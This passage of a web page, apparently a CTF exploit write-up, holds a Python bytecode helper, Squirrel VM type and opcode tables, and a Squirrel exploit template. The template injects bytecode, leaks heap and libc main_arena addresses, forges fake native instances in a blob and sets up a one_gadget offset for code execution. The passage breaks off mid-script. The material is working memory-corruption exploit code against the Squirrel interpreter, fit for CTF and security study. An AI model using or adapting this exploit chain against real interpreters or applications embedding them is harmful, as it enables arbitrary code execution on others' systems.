        self<span class="token punctuation">.</span>var_params <span class="token operator">=</span> var_params
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        ret <span class="token operator">=</span> <span class="token string">&quot;*********************************************************************\n&quot;</span>
        ret<span class="token operator">+=</span><span class="token string">&quot; - Function: %s\n&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>function_name<span class="token punctuation">)</span>
        ret<span class="token operator">+=</span><span class="token string">&quot;\n - Literals: \n&quot;</span>
        <span class="token keyword">for</span> idx<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token punctuation">:</span>
            ret<span class="token operator">+=</span> <span class="token string">&quot;[%03d] %r\n&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        ret<span class="token operator">+=</span><span class="token string">&quot;\n - Instructions: \n&quot;</span>
        <span class="token keyword">for</span> idx<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>instructions<span class="token punctuation">)</span><span class="token punctuation">:</span>
            ret <span class="token operator">+=</span> <span class="token string">&quot;[%03d] %r\n&quot;</span>  <span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span>
        ret <span class="token operator">+=</span> <span class="token string">&quot;*********************************************************************\n&quot;</span>
        <span class="token keyword">return</span> ret

</pre><p><strong>sqdef:</strong></p>
<pre data-role="codeBlock" data-info="py" class="language-python">SQUIRREL_VERSION_NUMBER <span class="token operator">=</span>  <span class="token number">310</span>

SQ_BYTECODE_STREAM_TAG <span class="token operator">=</span> <span class="token number">0xFAFA</span>
SQOBJECT_REF_COUNTED   <span class="token operator">=</span> <span class="token number">0x08000000</span>
SQOBJECT_NUMERIC       <span class="token operator">=</span> <span class="token number">0x04000000</span>
SQOBJECT_DELEGABLE     <span class="token operator">=</span> <span class="token number">0x02000000</span>
SQOBJECT_CANBEFALSE    <span class="token operator">=</span> <span class="token number">0x01000000</span>
SQ_MATCHTYPEMASKSTRING <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">99999</span><span class="token punctuation">)</span>
_RT_MASK <span class="token operator">=</span> <span class="token number">0x00FFFFFF</span>
_RT_NULL           <span class="token operator">=</span> <span class="token number">0x00000001</span>
_RT_INTEGER        <span class="token operator">=</span> <span class="token number">0x00000002</span>
_RT_FLOAT          <span class="token operator">=</span> <span class="token number">0x00000004</span>
_RT_BOOL           <span class="token operator">=</span> <span class="token number">0x00000008</span>
_RT_STRING         <span class="token operator">=</span> <span class="token number">0x00000010</span>
_RT_TABLE          <span class="token operator">=</span> <span class="token number">0x00000020</span>
_RT_ARRAY          <span class="token operator">=</span> <span class="token number">0x00000040</span>
_RT_USERDATA       <span class="token operator">=</span> <span class="token number">0x00000080</span>
_RT_CLOSURE        <span class="token operator">=</span> <span class="token number">0x00000100</span>
_RT_NATIVECLOSURE  <span class="token operator">=</span> <span class="token number">0x00000200</span>
_RT_GENERATOR      <span class="token operator">=</span> <span class="token number">0x00000400</span>
_RT_USERPOINTER    <span class="token operator">=</span> <span class="token number">0x00000800</span>
_RT_THREAD         <span class="token operator">=</span> <span class="token number">0x00001000</span>
_RT_FUNCPROTO      <span class="token operator">=</span> <span class="token number">0x00002000</span>
_RT_CLASS          <span class="token operator">=</span> <span class="token number">0x00004000</span>
_RT_INSTANCE       <span class="token operator">=</span> <span class="token number">0x00008000</span>
_RT_WEAKREF        <span class="token operator">=</span> <span class="token number">0x00010000</span>
_RT_OUTER          <span class="token operator">=</span> <span class="token number">0x00020000</span>

tmap<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">&apos;OT_NULL&apos;</span> <span class="token punctuation">:</span>          _RT_NULL<span class="token operator">|</span>SQOBJECT_CANBEFALSE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_INTEGER&apos;</span> <span class="token punctuation">:</span>       _RT_INTEGER<span class="token operator">|</span>SQOBJECT_NUMERIC<span class="token operator">|</span>SQOBJECT_CANBEFALSE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_FLOAT&apos;</span> <span class="token punctuation">:</span>         _RT_FLOAT<span class="token operator">|</span>SQOBJECT_NUMERIC<span class="token operator">|</span>SQOBJECT_CANBEFALSE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_BOOL&apos;</span> <span class="token punctuation">:</span>          _RT_BOOL<span class="token operator">|</span>SQOBJECT_CANBEFALSE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_STRING&apos;</span> <span class="token punctuation">:</span>        _RT_STRING<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_TABLE&apos;</span> <span class="token punctuation">:</span>         _RT_TABLE<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token operator">|</span>SQOBJECT_DELEGABLE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_ARRAY&apos;</span> <span class="token punctuation">:</span>         _RT_ARRAY<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_USERDATA&apos;</span> <span class="token punctuation">:</span>      _RT_USERDATA<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token operator">|</span>SQOBJECT_DELEGABLE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_CLOSURE&apos;</span> <span class="token punctuation">:</span>       _RT_CLOSURE<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_NATIVECLOSURE&apos;</span> <span class="token punctuation">:</span> _RT_NATIVECLOSURE<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_GENERATOR&apos;</span> <span class="token punctuation">:</span>     _RT_GENERATOR<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_USERPOINTER&apos;</span> <span class="token punctuation">:</span>   _RT_USERPOINTER<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_THREAD&apos;</span> <span class="token punctuation">:</span>        _RT_THREAD<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_FUNCPROTO&apos;</span> <span class="token punctuation">:</span>     _RT_FUNCPROTO<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_CLASS&apos;</span> <span class="token punctuation">:</span>         _RT_CLASS<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_INSTANCE&apos;</span> <span class="token punctuation">:</span>      _RT_INSTANCE<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token operator">|</span>SQOBJECT_DELEGABLE<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_WEAKREF&apos;</span> <span class="token punctuation">:</span>       _RT_WEAKREF<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
    <span class="token string">&apos;OT_OUTER&apos;</span> <span class="token punctuation">:</span>         _RT_OUTER<span class="token operator">|</span>SQOBJECT_REF_COUNTED<span class="token punctuation">,</span>
<span class="token punctuation">}</span>

name2op<span class="token operator">=</span><span class="token punctuation">{</span>
<span class="token string">&apos;LINE&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x00</span><span class="token punctuation">,</span>
<span class="token string">&apos;LOAD&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x01</span><span class="token punctuation">,</span>
<span class="token string">&apos;LOADINT&apos;</span><span class="token punctuation">:</span>            <span class="token number">0x02</span><span class="token punctuation">,</span>
<span class="token string">&apos;LOADFLOAT&apos;</span><span class="token punctuation">:</span>          <span class="token number">0x03</span><span class="token punctuation">,</span>
<span class="token string">&apos;DLOAD&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x04</span><span class="token punctuation">,</span>
<span class="token string">&apos;TAILCALL&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x05</span><span class="token punctuation">,</span>
<span class="token string">&apos;CALL&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x06</span><span class="token punctuation">,</span>
<span class="token string">&apos;PREPCALL&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x07</span><span class="token punctuation">,</span>
<span class="token string">&apos;PREPCALLK&apos;</span><span class="token punctuation">:</span>          <span class="token number">0x08</span><span class="token punctuation">,</span>
<span class="token string">&apos;GETK&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x09</span><span class="token punctuation">,</span>
<span class="token string">&apos;MOVE&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x0A</span><span class="token punctuation">,</span>
<span class="token string">&apos;NEWSLOT&apos;</span><span class="token punctuation">:</span>            <span class="token number">0x0B</span><span class="token punctuation">,</span>
<span class="token string">&apos;DELETE&apos;</span><span class="token punctuation">:</span>             <span class="token number">0x0C</span><span class="token punctuation">,</span>
<span class="token string">&apos;SET&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x0D</span><span class="token punctuation">,</span>
<span class="token string">&apos;GET&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x0E</span><span class="token punctuation">,</span>
<span class="token string">&apos;EQ&apos;</span><span class="token punctuation">:</span>                 <span class="token number">0x0F</span><span class="token punctuation">,</span>
<span class="token string">&apos;NE&apos;</span><span class="token punctuation">:</span>                 <span class="token number">0x10</span><span class="token punctuation">,</span>
<span class="token string">&apos;ADD&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x11</span><span class="token punctuation">,</span>
<span class="token string">&apos;SUB&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x12</span><span class="token punctuation">,</span>
<span class="token string">&apos;MUL&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x13</span><span class="token punctuation">,</span>
<span class="token string">&apos;DIV&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x14</span><span class="token punctuation">,</span>
<span class="token string">&apos;MOD&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x15</span><span class="token punctuation">,</span>
<span class="token string">&apos;BITW&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x16</span><span class="token punctuation">,</span>
<span class="token string">&apos;RETURN&apos;</span><span class="token punctuation">:</span>             <span class="token number">0x17</span><span class="token punctuation">,</span>
<span class="token string">&apos;LOADNULLS&apos;</span><span class="token punctuation">:</span>          <span class="token number">0x18</span><span class="token punctuation">,</span>
<span class="token string">&apos;LOADROOT&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x19</span><span class="token punctuation">,</span>
<span class="token string">&apos;LOADBOOL&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x1A</span><span class="token punctuation">,</span>
<span class="token string">&apos;DMOVE&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x1B</span><span class="token punctuation">,</span>
<span class="token string">&apos;JMP&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x1C</span><span class="token punctuation">,</span>
<span class="token string">&apos;JCMP&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x1D</span><span class="token punctuation">,</span>
<span class="token string">&apos;JZ&apos;</span><span class="token punctuation">:</span>                 <span class="token number">0x1E</span><span class="token punctuation">,</span>
<span class="token string">&apos;SETOUTER&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x1F</span><span class="token punctuation">,</span>
<span class="token string">&apos;GETOUTER&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x20</span><span class="token punctuation">,</span>
<span class="token string">&apos;NEWOBJ&apos;</span><span class="token punctuation">:</span>             <span class="token number">0x21</span><span class="token punctuation">,</span>
<span class="token string">&apos;APPENDARRAY&apos;</span><span class="token punctuation">:</span>        <span class="token number">0x22</span><span class="token punctuation">,</span>
<span class="token string">&apos;COMPARITH&apos;</span><span class="token punctuation">:</span>          <span class="token number">0x23</span><span class="token punctuation">,</span>
<span class="token string">&apos;INC&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x24</span><span class="token punctuation">,</span>
<span class="token string">&apos;INCL&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x25</span><span class="token punctuation">,</span>
<span class="token string">&apos;PINC&apos;</span><span class="token punctuation">:</span>               <span class="token number">0x26</span><span class="token punctuation">,</span>
<span class="token string">&apos;PINCL&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x27</span><span class="token punctuation">,</span>
<span class="token string">&apos;CMP&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x28</span><span class="token punctuation">,</span>
<span class="token string">&apos;EXISTS&apos;</span><span class="token punctuation">:</span>             <span class="token number">0x29</span><span class="token punctuation">,</span>
<span class="token string">&apos;INSTANCEOF&apos;</span><span class="token punctuation">:</span>         <span class="token number">0x2A</span><span class="token punctuation">,</span>
<span class="token string">&apos;AND&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x2B</span><span class="token punctuation">,</span>
<span class="token string">&apos;OR&apos;</span><span class="token punctuation">:</span>                 <span class="token number">0x2C</span><span class="token punctuation">,</span>
<span class="token string">&apos;NEG&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x2D</span><span class="token punctuation">,</span>
<span class="token string">&apos;NOT&apos;</span><span class="token punctuation">:</span>                <span class="token number">0x2E</span><span class="token punctuation">,</span>
<span class="token string">&apos;BWNOT&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x2F</span><span class="token punctuation">,</span>
<span class="token string">&apos;CLOSURE&apos;</span><span class="token punctuation">:</span>            <span class="token number">0x30</span><span class="token punctuation">,</span>
<span class="token string">&apos;YIELD&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x31</span><span class="token punctuation">,</span>
<span class="token string">&apos;RESUME&apos;</span><span class="token punctuation">:</span>             <span class="token number">0x32</span><span class="token punctuation">,</span>
<span class="token string">&apos;FOREACH&apos;</span><span class="token punctuation">:</span>            <span class="token number">0x33</span><span class="token punctuation">,</span>
<span class="token string">&apos;POSTFOREACH&apos;</span><span class="token punctuation">:</span>        <span class="token number">0x34</span><span class="token punctuation">,</span>
<span class="token string">&apos;CLONE&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x35</span><span class="token punctuation">,</span>
<span class="token string">&apos;TYPEOF&apos;</span><span class="token punctuation">:</span>             <span class="token number">0x36</span><span class="token punctuation">,</span>
<span class="token string">&apos;PUSHTRAP&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x37</span><span class="token punctuation">,</span>
<span class="token string">&apos;POPTRAP&apos;</span><span class="token punctuation">:</span>            <span class="token number">0x38</span><span class="token punctuation">,</span>
<span class="token string">&apos;THROW&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x39</span><span class="token punctuation">,</span>
<span class="token string">&apos;NEWSLOTA&apos;</span><span class="token punctuation">:</span>           <span class="token number">0x3A</span><span class="token punctuation">,</span>
<span class="token string">&apos;GETBASE&apos;</span><span class="token punctuation">:</span>            <span class="token number">0x3B</span><span class="token punctuation">,</span>
<span class="token string">&apos;CLOSE&apos;</span><span class="token punctuation">:</span>              <span class="token number">0x3</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
op2name <span class="token operator">=</span> <span class="token punctuation">{</span>v<span class="token punctuation">:</span> k <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> name2op<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

</pre><p><strong>template:</strong></p>
<pre data-role="codeBlock" data-info="lua as=&quot;lua&quot;" class="language-lua"><span class="token keyword">function</span> <span class="token function">get_addy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">local</span> l <span class="token operator">=</span> tostring<span class="token punctuation">.</span><span class="token function">pcall</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
    <span class="token keyword">local</span> idx <span class="token operator">=</span> l<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">&quot;0x&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>idx<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        l <span class="token operator">=</span> l<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
        idx <span class="token operator">=</span> l<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">&quot;0x&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> l<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">tointeger</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">ip2st</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">local</span> a <span class="token operator">=</span> <span class="token number">0x1337414243441337</span>
    <span class="token string">&quot;INJECT&quot;</span>
    <span class="token string">&quot;EJECT&quot;</span>
    <span class="token keyword">return</span> a
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">load_opcodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token string">&quot;INJECT&quot;</span>
    <span class="token string">&quot;EJECT&quot;</span>
    <span class="token function">ip2st</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">load_opcodes_cmp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token string">&quot;INJECT&quot;</span>
    <span class="token string">&quot;EJECT&quot;</span>
    <span class="token function">ip2st</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">map_offset</span><span class="token punctuation">(</span>a <span class="token operator">=</span> <span class="token number">0x4343434343434343</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

<span class="token punctuation">}</span>
<span class="token punctuation">::</span>base_addr <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token function">get_addy</span><span class="token punctuation">(</span>map_offset<span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;[*] base: 0x%016x\n&quot;</span><span class="token punctuation">,</span><span class="token punctuation">::</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">local</span> offset <span class="token operator">=</span> <span class="token number">0</span>
<span class="token punctuation">::</span>cmp <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token number">0x4343434343434343</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">local</span> i <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span> i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token punctuation">::</span>r <span class="token operator">&lt;</span><span class="token operator">-</span> i
    <span class="token function">load_opcodes_cmp</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">::</span>r<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">&quot; Found\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        offset <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">0x1</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;[*] base_offset: 0x%016x\n&quot;</span><span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">::</span>r<span class="token operator">&lt;</span><span class="token operator">-</span>offset


<span class="token function">load_opcodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">::</span>base_offset<span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">(</span>offset<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">addr2offset</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">local</span> o <span class="token operator">=</span> <span class="token punctuation">(</span>addr<span class="token operator">-</span><span class="token punctuation">::</span>base_addr<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">4</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>o <span class="token operator">+</span> <span class="token punctuation">::</span>base_offset<span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">offset2addr</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">local</span> o <span class="token operator">=</span> <span class="token punctuation">(</span>offset<span class="token operator">-</span><span class="token punctuation">::</span>base_offset<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>o <span class="token operator">+</span> <span class="token punctuation">::</span>base_addr<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">local</span> a <span class="token operator">=</span> <span class="token punctuation">::</span>r
    <span class="token keyword">local</span> b <span class="token operator">=</span> <span class="token function">blob</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token string">&quot;INJECT&quot;</span>
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
    <span class="token string">&quot;EJECT&quot;</span>
    <span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">local</span> b <span class="token operator">=</span> <span class="token function">blob</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">#</span>set main_arena pointer
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x05000002</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x4142434445464748</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x05000002</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x4141414141414141</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span>

<span class="token punctuation">::</span>cmp <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token number">0x4142434445464748</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">local</span> i <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span> i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token punctuation">::</span>r <span class="token operator">&lt;</span><span class="token operator">-</span> i
    <span class="token function">load_opcodes_cmp</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">::</span>r<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">&quot; Found\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        offset <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">0x2</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">local</span> add <span class="token operator">=</span> <span class="token function">offset2addr</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;[*] blob is at 0x%016x\n&quot;</span><span class="token punctuation">,</span> add<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">#</span>fake native instance
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0xa008000</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token string">&apos;i&apos;</span><span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span>add<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span>

<span class="token punctuation">::</span>r<span class="token operator">&lt;</span><span class="token operator">-</span><span class="token function">addr2offset</span><span class="token punctuation">(</span>add<span class="token operator">+</span><span class="token number">1024</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
<span class="token function">load_opcodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">local</span> l_main <span class="token operator">=</span> <span class="token function">get_addy</span><span class="token punctuation">(</span><span class="token punctuation">::</span>r<span class="token punctuation">)</span>
<span class="token keyword">local</span> l_offset <span class="token operator">=</span> <span class="token number">0x1eb080</span>
<span class="token keyword">local</span> oneg_offset <span class="token operator">=</span> <span class="token number">0xe6b99</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;[*] libc_main_arena leak: 0x%016x\n&quot;</span><span class="token punctuation">,</span> l_main<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>l_offset!<span class="token operator">=</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;[*] libc base: 0x%016x\n&quot;</span><span class="token punctuation">,</span>l_main<span class="token operator">-</span>l_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token operator">#</span>fake instance
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>vptr
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>vptr
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>vptr
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>vptr
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>vptr
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>uiref
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>weakref
